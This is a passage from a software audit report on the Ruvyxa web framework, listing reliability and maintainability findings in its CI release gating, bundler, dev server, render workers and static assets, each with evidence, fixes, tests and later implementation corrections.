- **Evidence:** `release.yml` triggers on `push: tags: ['v*.*.*']`; `ci.yml` triggers on the same
  tags; neither references the other. `publish-native` needs only
  `[resolve-version, verify-release]`, and `verify-release` is `runs-on: ubuntu-latest`. It runs
  none of `smoke-dev-server.mjs`, `test:full-flow`, or the twelve adapter deployment lanes, and no
  Windows, macOS, or arm64 runner. The existing gate is satisfied by the job's _name_, not its
  coverage.
- **Reproduction:** Push a tag on a commit whose only defect is Windows-specific. The two workflows
  start in parallel; `verify-release` can finish and `publish-native` can start while
  `test (windows-latest)` is still running or already red. Whether this is reachable also depends on
  branch/tag protection rules, which are not in the repository.
- **Root cause:** The release gate was designed as a self-contained re-verification rather than as a
  dependency on CI's verdict, and the self-contained version was scoped to one platform for cost.
- **Impact:** This repository's history is dominated by Windows-specific defects (`\\?\` prefix,
  CRLF/`newline_style`, `%TEMP%` ancestors, a `process.exit` abort on the Windows runner), and the
  full-flow walk covering scaffold-to-clean is deliberately `windows-latest` only. None of that
  class can block a publish.
- **Fix:** Either add `windows-latest` and `macos-latest` legs to `verify-release` via a matrix, or
  make the release wait on CI's verdict with a `workflow_run` gate. Then strengthen
  `nothing_publishes_before_the_release_candidate_is_verified` to assert what `verify-release`
  _covers_ — a matrix with more than one `os`, or the presence of the smoke steps — not only that a
  job by that name exists.
- **Regression risk:** A three-platform `verify-release` roughly triples the release critical path
  and will surface any latent flake as a publish blocker — the intended trade, but it should land
  with the retry wrappers `ci.yml` already uses.
- **Tests:** Extend `ci_workflows.rs` with a test asserting the job the publish jobs depend on runs
  on more than one `runs-on`, or that the release workflow declares a `workflow_run` dependency on
  CI.

### DEP-04 — `smoke-dev-server.mjs` kills the `cargo run` wrapper, not the dev server it spawned

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `scripts/smoke-dev-server.mjs:59-71`, `:467-470`; `.github/workflows/ci.yml:138-141`
- **Evidence:** Without `RUVYXA_CLI` the spawned child is `cargo`, and `ruvyxa dev` is cargo's
  child. `child?.kill()` signals only `cargo`; it neither kills the process group nor awaits an
  exit. The sibling harness gets this right — `smoke-runtime-adapter.mjs` spawns the runtime
  executable directly and awaits `'exit'` with a 2 s race.
- **Reproduction:** Run the smoke on Windows and, after the verdict, check that a `ruvyxa.exe` is
  still bound to 4402 and still holds a `notify` watcher on `examples/deploy-smoke`.
- **Root cause:** A wrapper process was chosen for convenience and the teardown was written as if
  the wrapper were the server.
- **Impact:** The orphaned dev server survives the step and outlives it inside the same CI job. On
  `windows-latest` the very next step is `cargo build -p ruvyxa_cli` followed by
  `pnpm test:full-flow`; a live `ruvyxa.exe` holds `target\debug\ruvyxa.exe` open — an "Access is
  denied" link failure — and holds a watcher on `examples/deploy-smoke` while eleven subsequent
  adapter builds rewrite `.ruvyxa/`. Exactly the shape that reads as a flaky runner. Not confirmed
  to have fired; nothing prevents it.
- **Fix:** Build the CLI once before the smoke and pass its path as `RUVYXA_CLI` in `ci.yml` (the
  script already supports this and it removes the wrapper entirely), and mirror
  `smoke-runtime-adapter.mjs`'s teardown: kill, await `'exit'` with a timeout, escalate to a tree
  kill (`taskkill /pid <pid> /T /F` on win32, `process.kill(-pid)` with `detached: true` elsewhere).
- **Regression risk:** Setting `RUVYXA_CLI` means the smoke no longer implicitly verifies
  `cargo run` works — already covered by every other lane in the job.
- **Tests:** A post-step in `ci.yml` asserting port 4402 is free after the smoke, which fails by
  name instead of as a later mystery.

### DEP-05 — The reproducibility gate runs in no workflow, and its telemetry list has drifted from the Rust one it claims to mirror

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `scripts/verify-reproducible.mjs:38-53`; `package.json:27`;
  `crates/ruvyxa_cli/src/bench.rs:35-41`; `scripts/check-cross-language-constants.mjs:220-224`
- **Evidence:** `verify:reproducible` appears in no workflow. Its `TELEMETRY_FIELDS` has nine
  entries against the Rust list's five, under a comment claiming they are kept in step. Nothing can
  see the pair: the cross-language scan covers `crates/**/*.rs` and `packages/**`, and `scripts/**`
  is not in that list.
- **Reproduction:** Add a field to `bench.rs`'s `TELEMETRY_FIELDS` — what happens when a new build
  counter lands in `client/manifest.json` — then run `pnpm verify:reproducible`. It reports the new
  field as a non-reproducible difference.
- **Root cause:** Two facts held only by a comment saying they mirror each other — the exact pattern
  the cross-language checker's own header says a comment is not sufficient for — combined with the
  gate's glob not reaching `scripts/`. The current four-field difference is behaviourally inert, so
  nothing has broken yet; the risk is entirely forward.
- **Impact:** The one end-to-end proof that Ruvyxa's ordering discipline, `localeCompare` ban, and
  locale-folding ban actually produce byte-identical builds is never run automatically. When someone
  does run it, a drifted list can report a false "not reproducible" verdict costing a long
  investigation.
- **Fix:** (1) Add `verify:reproducible` to `ci.yml`, at minimum on `ubuntu-latest` against
  `examples/deploy-smoke`. (2) Add `scripts/**/*.mjs` to the `git ls-files` pathspec in
  `check-cross-language-constants.mjs`, then either register `TELEMETRY_FIELDS` as `unrelated` with
  the real reason or export the Rust list into a fixture both sides read.
- **Regression risk:** Widening the scan to `scripts/` will surface other same-named constants
  needing registry entries — a one-time cost and the registry's whole purpose. The reproducibility
  lane adds two full builds to CI wall time.
- **Tests:** The fixture itself is the test. Failing that, a Rust test that reads the script and
  asserts `TELEMETRY_FIELDS` is a superset of the Rust list, with a reason for each extra entry.

### DEP-06 — `pack-smoke.mjs` carries two hand-maintained package lists that no gate derives or checks

- **Category:** Maintainability · **Confidence:** CONFIRMED
- **Files:** `scripts/pack-smoke.mjs:21-42`, `:363-381`;
  `scripts/validate-release-publish-plan.mjs:28-48`; `scripts/workspace-packages.mjs:33-49`
- **Evidence:** `workspace-packages.mjs` exists so package discovery is derived, and
  `validate-release-publish-plan.mjs` uses it to prove its hand-ordered list matches the tree.
  `pack-smoke.mjs` imports neither: it has a literal `packages` array and a literal
  `workspaceOverrides` array, the latter with a comment naming the failure it guards but no
  mechanism. Both lists are currently correct.
- **Reproduction:** Add a twelfth adapter package, add it to `ruvyxa`'s dependencies, and add it to
  `validate-release-publish-plan.mjs`'s `orderedPackages` (which its own check forces).
  `pnpm release:validate` passes; `pnpm pack:smoke` then fails inside `pnpm install --no-lockfile`
  with npm's `No matching version found for @ruvyxa/adapter-x@^1.1.3` — a message naming neither
  this file nor the missing override.
- **Root cause:** The derived-discovery fix was applied to three scripts and not the fourth.
- **Impact:** A recurring, already-experienced release-time trap. It fails loudly, so nothing ships
  broken — the cost is diagnosis time at exactly the moment a tagged release is most expensive.
- **Fix:** Derive `packages` from `workspacePackageDirs()` filtered to non-`@ruvyxa/cli-*` plus
  `currentPlatformPackage`, and derive `workspaceOverrides` from
  `Object.keys(ruvyxaManifest.dependencies).filter(name => name.startsWith('@ruvyxa/'))`. Both are
  three-line changes and both remove a list.
- **Regression risk:** Deriving `packages` changes pack order; the loop is order-independent.
  Deriving `workspaceOverrides` would start including `@ruvyxa/core`, already emitted separately —
  de-duplicate or drop the separate line.
- **Tests:** Once derived, no list to test. Until then, a check in
  `validate-release-publish-plan.mjs` asserting every `@ruvyxa/*` dependency of `ruvyxa` appears in
  `pack-smoke.mjs`'s `workspaceOverrides`, moving the failure to `release:validate` time.

---

# Low

Sixty-two findings, grouped by subsystem. Each is confirmed unless marked otherwise, and each is
stated compactly: what, where, why it matters, and what to do.

## Bundler front-end

**BUNF-08 — The JSX _guess_ seeds a `react/jsx-runtime` edge for `.ts` modules the transform never
gives JSX to.** _Reliability._ `resolver.rs:1978` gates the seed on `parsed.has_jsx`, the scanner's
`<`-heuristic, so `const m = new Map<string, number>()` in a `.ts` file sets it. `compiler.rs:668`'s
`jsx_is_enabled` explicitly refuses JSX for `.ts`/`.mts`/`.cts` and the resolver does not consult
it, though it has the extension in hand two lines away. **Impact:** phantom graph edges on every
plain-TypeScript module mentioning a generic type — inflating the module graph, perturbing
shared-chunk analysis (which keys on `module.deps`), and pulling `react/jsx-runtime` into route
bundles that render nothing. No output corruption, which is why it is Low. **Fix:** gate on
`compiler::jsx_is_enabled(extension, parsed.has_jsx)`; pass `"tsx"` for the virtual entry, which has
no extension. **Risk:** a `.ts` file genuinely containing JSX loses its seeded edge — but
`jsx_is_enabled` already refuses JSX for `.ts`, so such a file does not compile today either.
**Tests:** a `.ts` module containing `Map<string, number>` has no `react/jsx-runtime` dependency
while a `.tsx` module containing `<main />` does.

**BUNF-09 — One decorator-placement rule, written twice, with nothing holding the two copies
level.** _Maintainability._ `ast.rs:957`'s `decorator_can_start` and `compiler.rs:903`'s
`begins_decorator` have byte-identical bodies, joined only by a comment saying "Kept level with".
**Impact:** raises defect risk on the next change specifically: widening only `decorator_can_start`
makes `has_decorators` true while `begins_decorator` matches no site, so the decorator survives and
oxc rejects it naming a character; widening only `begins_decorator` makes `has_decorators` false and
the stripper short-circuits — the decorator survives the same way. Both failures name the wrong
cause. **Fix:** make `ast::decorator_can_start` `pub(crate)` and have `compiler` call it. **Risk:**
none — the bodies are already identical. **Tests:** `a_caller_supplied_plan_matches_self_parsing`
already compares the two paths on a corpus; adding a member-position decorator
(`class S { @log run() {} }`) makes it also protect against future divergence.

**Correction (2026-08-30, from implementing this):** the rule is written _three_ times, not twice,
and the third copy is already stale. `compiler.rs`'s `has_decorator_candidate` — the pre-filter that
lets `strip_decorators` skip parsing — still asks whether some line's first non-blank character is
`@`, which is the rule as it stood _before_ `begins_decorator` was widened to member positions. The
recommended test does not merely guard against future divergence: it fails today.
`strip_decorators_with_plan("class S { @log run() {} }", plan)` strips the decorator and
`strip_decorators` on the same source returns it untouched, so the public `compiler::transform` /
`transform_with_options` entry points emit `@log` into plain JavaScript. The compile path always
supplies a plan, so no build ships that.

Levelling the pre-filter with `source.contains('@')` was tried and reverted, because it exposes a
defect that is not this one and is worse than it: `ast` records no JSX text spans, so JSX children
are scanned as code, and in `export const el = <p>write to @support</p>` the `@` is in a code
position with an alphanumeric before it. `parse_module` reports `has_decorators`, and the stripper
deletes `@support` from the page — silently, on the plan path, which is the one every build uses.
The `an at sign in jsx text` case in `DECORATOR_CORPUS` is meant to catch exactly this and passes
only because it is asserted through `strip_decorators`, whose stale pre-filter short-circuits before
the stripper runs. The `@` cannot be told from a decorator at byte level: a class field written
without a semicolon puts an alphanumeric before a real decorator on the next line via ASI, and
`@First @Second class S {}` puts one there on the same line, so neither narrowing the previous-byte
clause to keywords nor requiring an intervening newline is sound. This needs the scanner to learn
JSX text spans in both languages, held by `tests/fixtures/source-scanner-conformance.json`, and it
needs its own finding — it is silent deletion of rendered content, not a Low.

What landed here is the fix as written (`ast::decorator_can_start` is `pub(crate)` and `compiler`
calls it) plus a comment on `has_decorator_candidate` naming it as the third copy, why it is
deliberately narrower than the rule it fronts, and the order the two must be fixed in. The
member-position cases were added to `a_caller_supplied_plan_matches_self_parsing` behind a
line-leading decorator, which is the most of that case the pre-filter currently admits.

**Correction (2026-08-30, second pass, from finishing this):** closed. The JSX half is `RUV-H21`,
and with both scanners recording JSX text the pre-filter was safe to level. It is gone:
`strip_decorators` now asks only `source.contains('@')`, which is not a placement rule — a module
with no `@` has nothing to strip whatever the rule is — so `ast::decorator_can_start` is the single
answer to where a decorator may sit, in both the plan and the plan-less path. The member-position
cases in `a_caller_supplied_plan_matches_self_parsing` no longer need a line-leading decorator above
them, and `class S { @log run() {} }` is asserted bare; the two asserts on the deleted function were
rewritten to ask `parse_module(…).has_decorators` instead, which is the rule itself. The predicted
failure was exact: before the levelling, that case reported
`left: "class S {  run() {} }" / right: "class S { @log run() {} }"`.

**BUNF-10 — RUV1008 is emitted once per read occurrence rather than once per variable name.**
_Maintainability._ `boundary.rs:106` loops over `private_env_reads`, which is documented as "in
source order and unfiltered" and does not deduplicate. **Impact:** diagnostic noise proportional to
how badly a module violates the rule, so the output is loudest exactly when the reader most needs to
see the _set_ of leaked names; and because these are carried as rendered strings through the
shared-chunk artifact cache, the duplication is stored too. **Fix:** collect into a
`BTreeSet<String>` before the loop, or dedup preserving first-seen order. **Risk:** none beyond
diagnostic counts. **Tests:** a module reading the same private variable twice yields exactly one
RUV1008.

**Correction (2026-08-30, from implementing this):** `boundary.rs` is one of two places that draws
this conclusion. `ruvyxa_graph/src/validate.rs`'s `validate_client_module` loops over the same
`private_env_reads` and duplicates identically, so `ruvyxa check` and `ruvyxa dev` still report one
RUV1008 per occurrence while `ruvyxa build` now reports one per name — the two hosts disagree on the
same file. Only `boundary.rs` was fixed here: `ruvyxa_graph` was mid-refactor and owned by another
task, and the dedup belongs at each emission site rather than inside `private_env_reads`, whose
"source order and unfiltered" contract is what the `extraction` section of
`tests/fixtures/env-policy-conformance.json` holds level with `privateEnvReads` in `compiler.mjs`.
The graph half needs the same three lines. `compiler.mjs`'s own `checkClientBoundary` is unaffected:
it throws on `envNames[0]` and never lists.

## Bundler back-end

**BUNB-06 — `fold_production_node_env` stops after 64 guards.** _Reliability._ `minifier.rs:226` is
a `for _ in 0..64` loop whose ceiling was chosen to bound cost, not to bound the number of real
guards — `find_node_env_conditional` restarts its scan from offset 0 each iteration, so the loop is
O(64 × n) per module. Guards past the 64th survive, and nothing downstream can fold them: the linker
injects `var process = globalThis.process || { env: { NODE_ENV: "production" } }`, which oxc's
compressor cannot constant-fold. **Impact:** development-only warning code and its string literals
ship to browsers in the affected case — larger bundles and console noise, not incorrect behaviour.
Narrow: the ordinary React shape has a one-guard shim that folds. **Fix:** resume the scan from the
previous match's `start` (a replacement can only shorten or preserve the prefix before it), then
raise or remove the ceiling; keep one only as a safety net and surface it if hit. **Risk:** folding
more guards changes affected dependencies' bytes and cache keys — a rebuild and smaller output.
**Tests:** a source with 100 sequential guards, none surviving.

**Correction (2026-08-30, from implementing this):** the defect and its impact are exactly as
described, but the recommended fix does not remove the cost the ceiling was there to bound. Resuming
the scan from the previous match's `start` skips the re-examination of the prefix, and the prefix
walk is not what a fold costs: `find_node_env_conditional` calls `ast::masked_code` over the whole
module on every call, and a resumed scan still needs the full mask, because it is the whole file's
lexical state that decides whether a byte is code. Measured on a 1.1 MB module with 500 guards, the
resume-only fix folded all 500 in 400 ms — sixty-four folds had cost 30 ms — so "raise or remove the
ceiling" alone trades a correctness bug for a build-time one on exactly the minified dependencies
this pass exists for. What shipped instead makes the pass, not the fold, the unit of work: one
`masked_code` scan collects every non-overlapping guard (the scan resumes at a match's `end` rather
than descending into it) and the matches are applied last-first, so passes are bounded by nesting
depth rather than by guard count. The same module now folds in 5 ms. No safety net is needed either,
and "surface it if hit" would have been a promise nothing could keep — the function returns a
`String` and has no diagnostic channel. Termination is a property of the rewrite: every replacement
is one of the guard's own inner spans (the surviving block, the `else` block, the rest of an
`else if` chain, or nothing), each of which begins strictly after the `if` it replaces, so a pass
that folds anything strictly shortens the text. That invariant is a `debug_assert!` with a
release-mode `break` behind it, which stops with the source unfolded rather than spinning. The
recommended test also passes against a one-pass implementation, because 100 _sequential_ guards all
fold in a single pass; `deeply_nested_guards_all_fold` and
`an_else_if_chain_of_guards_folds_all_the_way_down` are the two that go red without the outer loop,
and both were seen red against it.

**BUNB-07 — `sourcesContent` writes `""` for a source with no recorded content.** _Reliability._
`sourcemap.rs:266` maps `Option<String>` through `unwrap_or("")`; `build_source_map` passes `None`
for every module served from the shared-route registry. Source Map v3 reserves `null` for "content
not available"; `""` means "this file is empty". **Impact:** DevTools shows an empty file rather
than falling back to fetching the original, so stepping into a shared module lands in a blank pane.
Cosmetic but misleading, and only with source maps enabled. **Fix:** change the field to
`&'a [Option<&'a str>]` and pass the options through; `serde_json` writes `null` for `None`.
**Risk:** none to the bundle; a consumer assuming every entry is a string sees `null`, which is the
specified shape. **Tests:** assert `sourcesContent` contains `null` for a source registered with
`None`.

## Dev/production server request path

**DEVR-07 — `validate_socket_path` guards axum 0.7 route syntax, not axum 0.8's.** _Reliability._
`lib.rs:1182` rejects `?`, `#`, `*` — the axum 0.7 wildcard alphabet — while the workspace is on
axum 0.8.9, where captures are `{name}` and catch-alls `{*rest}`. **Impact:** a plugin declaring
`realtime: { path: '/{room}' }` passes the guard and then registers a single-segment capture that
shadows every one-segment project page; a descriptor declaring `path: '/{'` passes and panics inside
`matchit` during `Router::route` — precisely the outcome the guard exists to prevent. Descriptors
come from `ruvyxa.config.ts`, so this is fail-confusingly rather than attacker-reachable. **Fix:**
reject `{` and `}` alongside the existing set and name the axum version the list tracks; tighter
still, require `^(/[A-Za-z0-9._~-]+)+$`, which is what both transports need. **Risk:** a plugin
deliberately registering a parameterised transport path would be refused; no first-party plugin
does. **Tests:** `/{room}`, `/{`, `/{*rest}`, `/api/socket`, and a reserved path — there is no test
for this function at all today.

**Correction (2026-08-30, from implementing this):** the finding is right about the defect and about
the fix, and incomplete about where it lives. `validate_socket_path` is the _second_ implementation
of this rule, not the only one: `isExactApplicationPath` in
`packages/ruvyxa/runtime/plugin-http.mjs` guards `normalizeRealtime`/`normalizePresence` with the
same `?`/`#`/`*` denylist, runs _first_ (inside the plugin host, before the descriptor is handed
over), and produces the diagnostic a plugin author actually reads. Fixing only the Rust half would
have left `/{room}` accepted at the point the message is written and refused one process later. Both
halves take the allowlist now, and `transportPaths` in
`tests/fixtures/framework-endpoint-conformance.json` holds them level —
`a_transport_path_is_accepted_or_refused_as_the_contract_says` in the Rust host, and
`agrees with the native host on which transport paths a plugin may claim` in
`tests/packages/ruvyxa/framework-endpoints.test.mjs`. `isExactApplicationPath` stays as it is for
`http.route({ path })`, which is compared by string equality in the plugin stage and never reaches a
router, so the axum alphabet is not its question.

**DEVR-08 — `built_style_asset`'s stale-result guard can never fire.** _Maintainability._
`lib.rs:977` takes the write lock and _then_ reads `cached.generation` from the slot it is about to
write, so `insert_if_current(generation, …)` is a tautology. The three sibling slots capture the
generation _before_ the filesystem work, which is the whole point. `RuntimeCache::invalidate` also
omits `style_asset` entirely, so its generation is permanently `0`. **Impact:** no live defect. It
raises defect risk specifically: the moment anyone adds
`self.style_asset.blocking_write() .invalidate();` — the obvious fix for "`ruvyxa start` serves a
stale stylesheet URL after an in-place redeploy" — the guard will not stop a read that began before
the invalidation from installing its stale answer, and the failure will look exactly like the bug
`a_stylesheet_saved_during_a_collection_is_not_installed_stale` exists to prevent for the
neighbouring slot. **Fix:** capture the generation inside the read-lock block, as `asset_links`
does. **Risk:** none — behaviour is identical today; only the guard becomes real. **Tests:** extend
`cache_slot_rejects_work_started_before_invalidation` to cover `style_asset` once it participates in
invalidation.

**DEVR-09 — `parse_env_source` is line-based, so a quoted multi-line value truncates and spawns junk
variables.** _Reliability._ `env_file.rs:35` walks `source.lines()` and `unquote_env_value` strips
quotes only within one line. **Impact:** a `.env` containing a PEM key sets `PRIVATE_KEY` to
`"-----BEGIN PRIVATE KEY-----` (leading quote kept) and parses the base64 line — which contains `=`
— as a _second_ variable. Inline comments are also not stripped: `PORT=3000 # dev` yields
`"3000 # dev"`. Any project with a multi-line secret in `.env` (service-account keys, PEM
certificates, SSH keys — routine for the auth and deploy integrations this framework ships) gets a
silently truncated value plus junk environment variables in every worker process, and those junk
names fold into `build_dependency_hash` and the artifact cache key. **Fix:** make the parser
quote-aware — when a value opens with `"` or `'` and does not terminate on the same line, keep
consuming lines until the matching quote, joining with `\n`; strip an unquoted trailing ` #` comment
while leaving `#` inside quotes alone. **Risk:** a project depending on the truncated value would
see a different one; restrict comment stripping to the unquoted branch. **Tests:** extend
`parses_env_sources` with a multi-line quoted value, a single-quoted one, and an unquoted value with
a trailing comment.

**DEVR-10 — `ruvyxa start` silently binds a different port when the configured one is taken.**
_Reliability._ `port_binding.rs:38` scans `0..=PORT_FALLBACK_SCAN_LIMIT` (100) and nothing in
`bind_listeners` consults `config.watch`; `serve` calls it identically for `dev` and `production`.
**Impact:** in a container or under a supervisor, a healthy-looking `ruvyxa start` binds a port
nothing routes to. The orchestrator's health check fails against the configured port and the process
restarts in a loop, with the real cause — usually the previous instance not having exited — reported
only as a line on stdout. The other host does not do this: it reads `PORT` and lets `EADDRINUSE`
surface as a crash the supervisor can act on. **Fix:** gate the fallback scan on `config.watch`; in
production try `offset == 0` only and return `port_conflict_diagnostic`, which already names the
owning PID — so the production message gets _better_. **Risk:** a user relying on `--port 3000`
quietly moving to 3001 in a local preview now gets RUV1201. **Tests:**
`bind_listeners_use_next_available_port_when_requested_port_is_busy` builds its config with
`ServerConfig::dev`; add the `production` mirror asserting RUV1201.

**Correction (2026-08-30, from implementing this):** the finding holds, with one constraint it did
not anticipate. The production branch's explanation and suggestion are rewritten — it no longer
claims to have scanned a range it never tried, and it points at `PORT` as well as `--port` — but the
diagnostic **title** had to stay `No available server port was found`. Diagnostic titles are read
out of these source literals by `one_diagnostic_code_carries_one_meaning` in
`crates/ruvyxa_diagnostics/src/lib.rs`, whose whole point is that one code carries one meaning; a
second title under `RUV1201` would have been a new collision, and that test's allowlist explicitly
may not be extended to admit one. So "the production message gets better" is true of the body and
not of the heading.

**DEVR-11 — No admission control or overload answer on this host, unlike the standalone server.**
_Reliability._ `build_app_router` and the layer stack contain no concurrency limit, no queue cap,
and no request timeout layer; the only backpressure is the per-worker 256-slot stdin queue and the
per-request timeout, neither of which produces a `503` or bounds how many requests are in flight.
The standalone server — the same long-lived self-hosted shape — has `WorkerAdmissionController` with
`RUVYXA_MAX_CONCURRENCY`/`RUVYXA_MAX_QUEUE` and answers `503` past both. **Impact:** under load or a
cheap unauthenticated flood, `ruvyxa start` degrades to unbounded queueing: every request waits,
none is refused, latency grows without limit, and `/__ruvyxa/health` still answers `200` because it
does not read queue depth. The same application deployed through a self-hosted adapter sheds load
correctly. This is the _behaviour_ half of the same divergence DEVR-02 covers for shutdown. **Fix:**
`tower::limit::GlobalConcurrencyLimitLayer` plus `tower::load_shed::LoadShedLayer` mapped to
`503 + Retry-After`, sized from the same env vars with the same defaults, applied _after_ the
framework endpoints so `/__ruvyxa/health` is answered before admission — exactly as the standalone
host explains it must be. **Risk:** a limit set too low refuses legitimate traffic; the standalone
defaults are the calibrated starting point, `RUVYXA_MAX_CONCURRENCY=0` must keep meaning "off", and
`ruvyxa dev` should default to off. **Tests:** saturate the limit and assert the next request gets
`503` with `Retry-After`, plus a case asserting `/__ruvyxa/health` still answers `200` while the
limiter is saturated.

## Render workers, pipeline, cache, watcher

**DEVC-06 — The two shutdown grace windows disagree: the worker asks for 5 s, the pool kills it
after 2 s.** _Reliability._ `WORKER_SHUTDOWN_TIMEOUT` is 2 s; `worker-pool.mjs:248` sets
`setTimeout(() => process.exit(0), 5000)`. Any `Worker::shutdown` while the worker holds an active
request takes the kill branch, because the worker's self-exit deadline is 2.5× longer than the
host's patience. **Impact:** small on its own — an extra `TerminateProcess`/`SIGKILL` and a warning
line per shutdown — but it removes the only mechanism by which a worker's in-flight requests could
finish during a replacement, which is what makes RUV-H15's blast radius total rather than partial.
Every `ruvyxa build` end-of-run and every `recycle` logs "Node worker did not stop in time".
**Fix:** send the grace window to the child in the environment the way `RUVYXA_WORKER_TIMEOUT_MS`
already is, and set the Rust constant to that value plus a margin. Failing that, put both constants
in a shared fixture asserted from both languages. **Risk:** a longer Rust wait makes
`pool.shutdown()` — and Ctrl-C — take longer when a worker is genuinely wedged; the waits are
already concurrent across workers, so the cost is one window. **Tests:** a cross-language fixture
test asserting the Rust constant is ≥ the JS one.

**Correction (2026-08-30, from implementing this):** the disagreement is real and the recommended
fix is the right one, but two of the details are wrong. The `setTimeout` is at
`worker-pool.mjs:266`, not `:248`. And the Impact paragraph overstates the visible symptom: the line
above the timer is `if (admission.activeRequests === 0) process.exit(0)`, so an idle worker exits
the instant its stdin closes and the host's wait ends with it. `ruvyxa build` end-of-run and
`recycle` therefore do **not** log "Node worker did not stop in time" every time — only a shutdown
that reaches a worker still holding a request does, which is precisely the case the grace exists
for. That makes the finding's real substance the second half of its own Impact: the grace is
unreachable, so an in-flight request never survives a replacement. Implemented as the first branch
the finding names rather than as a fixture: the host normalizes `RUVYXA_WORKER_SHUTDOWN_MS` into the
child's environment exactly as `configure_worker_timeout` already does for the request deadline, and
waits that value plus a one-second margin. A fixture comparing two independently written literals
would still have let an operator raise one half alone; deriving both from one value cannot. The
default literals are additionally registered as `sameValue` in
`scripts/check-cross-language-constants.mjs`.

**DEVC-07 — `EditTrace::events` is unbounded and appendable from an HTTP endpoint.** _Reliability._
`trace.rs:27` bounds the store in _traces_ but not in _events per trace_, and `record` is reachable
from `/__ruvyxa/trace-ack` with a caller-supplied id. **Impact:** dev-mode only and doubly gated
(`config.watch && config.debug_traces`, plus a same-site origin check), so not a production
exposure. It is still an unbounded allocation driven by request volume, and `snapshot()` clones
every event on each DevTools poll, so a large trace makes the DevTools endpoint progressively more
expensive. **Fix:** cap `events` in `record` (64 per trace) and collapse further pushes with a
`+N more` counter, still returning `true` so the endpoint's 404-on-unknown-id semantics are
unchanged. **Risk:** a capped timeline could hide a late stage in a genuinely long edit; keeping the
first N plus a tail counter avoids losing the acknowledgement that matters. **Tests:** extend
`store_is_bounded_and_filters_by_path` to push past the cap into one trace.

**DEVC-08 — `output_with_timeout` leaks the child and two threads if `try_wait` errors.**
_Reliability._ `process.rs:101`'s `child.try_wait()?` returns from the function with the `Child`
still owned by the loop's scope. `std::process::Child` does not kill on drop — the module's own doc
says so — and the two drain threads are never joined on that path. **Impact:** a leaked JavaScript
runtime process holding handles on the build directory, the exact failure the module was written to
prevent, plus two detached threads blocked on `read_to_end`. Rare: `try_wait` fails only on an
unexpected `waitpid`/`WaitForSingleObject` error. **Fix:** replace the `?` with a match that, on
`Err`, kills and waits the child and joins the readers before propagating — or restructure so the
kill/reap and joins run in a scope guard. **Risk:** none meaningful; the change only adds cleanup to
a path that has none. **Tests:** hard to provoke portably; a structural test asserting every exit
from the wait loop is preceded by kill-and-reap is more useful, or refactor the cleanup into a
`Drop` guard.

**DEVC-09 — A narrow window in `replace_saturated_worker` can leave a retired process owned only by
its detached drain task.** _Reliability._ The pool swap and the `retiring` registration are two
separate lock acquisitions with no shared critical section, and `shutdown` samples the two lists at
different instants, `workers` first. The interleaving needed is: retire swaps `workers` → shutdown
reads `workers` → shutdown takes `retiring` (empty) → retire pushes to `retiring`. **Impact:**
exactly the orphan the `retiring` field was added to prevent — the CLI exits, the detached drain
task is never unwound, nothing drops the `Child`, `kill_on_drop` never runs, and a `node` process is
left holding handles on the build directory. Vanishingly unlikely per occurrence, but `ruvyxa build`
retires a worker every 32 isolated renders, so a large static site performs the transition many
times per build. **Fix:** register the worker in `retiring` **before** removing it from `workers`,
so the overlap is a duplicate rather than a gap (`Worker::shutdown` is already idempotent).
`recycle` has the same shape and the same fix. **Risk:** a worker briefly in both lists means
`shutdown` may be called on it twice concurrently, which is already safe; deduplicate with
`Arc::ptr_eq` to avoid a confusing double warning. **Tests:** assert the ordering — that a worker
removed from `workers` is already present in `retiring` — via a test-only hook that snapshots both
lists between the two steps.

**Correction (2026-08-30, from implementing this):** the race is real and both call sites have it,
but the recommended fix is weaker than it needs to be. Registering before the swap narrows the
window to a duplicate rather than closing it, and then requires an `Arc::ptr_eq` deduplication to
stop `shutdown` warning twice about one process — a second rule to keep in step with the first.
`retiring` and `workers` are separate locks that no path nests in the opposite order, so both can be
taken at once: the swap and the registration are now one critical section in
`NodeWorkerPool::install_replacement`, and `recycle` extends `retiring` with the whole outgoing
generation under the same guard. There is then no instant at which the process is in neither list
and none at which it is in both, so no deduplication is needed. The test hook the entry proposes has
no place to hook into for the same reason; the ordering is asserted instead by holding the register
and observing that the pool has not yet let go of the worker.

**DEVC-10 — `open_response` waits without a ceiling on the stdin queue, outside the request
timeout.** _Reliability._ **Confidence: SPECULATIVE.** The request timeout is applied only to the
_response_ wait; queuing the line to the writer task is outside it, and the channel is bounded at
256 with a writer that awaits `stdin.write_all(...)`. **What would confirm or kill it:** a stub
worker that never reads stdin (`process.stdin.pause()` with no `readline`), then 257 requests — does
the 257th `send` return or hang past the response timeout? **What likely kills it in practice:**
`worker-pool.mjs` uses `readline` on a resumed stdin and never pauses it, so the child keeps
consuming lines even while rendering and the pipe should not fill. **Impact if reachable:** a
request hangs past every deadline the caller believes it has, with no error surfaced — the shape
`process.rs` exists to prevent on the synchronous side. **Fix:** wrap the whole of
`Worker::send`/`start_api_response` in the response timeout rather than just the receive, or use
`try_send` with a bounded retry so a full queue becomes an immediate "worker is saturated" error the
pool can route around. **Risk:** moving the timeout to cover the enqueue slightly shortens the
effective render budget; combined with RUV-H15's grace that is neutral. **Tests:** a stub worker
that never reads stdin, asserting `Worker::send` returns an error within the response timeout.

**Correction (2026-08-30, from implementing this):** confirmed, and it should not have stayed
labelled SPECULATIVE. Reverting the fix and running the new test
`a_full_stdin_queue_fails_within_the_response_timeout` reproduces the hang exactly: `open_response`
never returns, and the outer 10 s guard is what ends the test. The "what likely kills it in
practice" paragraph is a mitigation, not a guarantee — `readline` only keeps consuming while the
worker's event loop is turning, and `MAX_CONSECUTIVE_WORKER_TIMEOUTS` exists precisely because a
worker whose loop is blocked is a state this pool already expects. The proposed reproduction would
not have shown it either: the stdin channel is drained by a writer task into the OS pipe buffer, so
257 requests fill neither, and the number needed depends on the platform's pipe size. Fixed as the
first branch the entry names — the response timeout now covers the enqueue — which costs the render
nothing, because `WORKER_TIMEOUT_GRACE` was added to the host's budget for the enqueue in the first
place.

## Static assets, documents, CSS, images

**ASSET-06 — No `Last-Modified` and no `If-Modified-Since` on any static path.** _Reliability._
`rg -n "LAST_MODIFIED|IF_MODIFIED_SINCE"` over `crates/` and `packages/` returns nothing, and the
code notes the consequence itself: "a date-formed `If-Range` is never compared, because this server
sends no `Last-Modified` for it to have come from" — so `requested_range` takes the safe-but-lossy
`RangeRequest::Whole` branch for any date-form `If-Range`. **Impact:** bandwidth and latency only.
Every `public/` asset ships `must-revalidate`, so date-only revalidation is the steady state for
exactly the clients that cannot use ETags, and each pays a full transfer per revalidation; a resumed
